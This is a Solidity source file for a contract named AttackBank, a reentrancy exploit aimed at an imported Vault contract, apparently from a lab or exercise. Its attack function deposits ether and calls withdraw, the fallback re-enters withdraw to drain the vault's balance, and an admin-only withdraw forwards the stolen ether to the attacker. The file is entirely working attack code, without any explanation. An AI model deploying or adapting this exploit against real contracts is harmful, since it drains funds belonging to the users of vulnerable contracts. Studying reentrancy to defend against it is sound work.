
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";

contract AttackBank {
    Vault public attk;
    address public admin;
    constructor(address _a, address _admin) {
        attk = Vault(payable(_a));
        admin = _admin;
    }

    // 
    fallback() external payable {
        if (address(attk).balance >= 0) {
            attk.withdraw();
        }
    }

    function attack() external payable {
        // require(msg.value >= 1 ether);
        attk.deposite{value: msg.value}();

        attk.withdraw();
    }

    function withdraw() public payable {
        require(msg.sender == admin);
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Failed to send Ether");
    }

}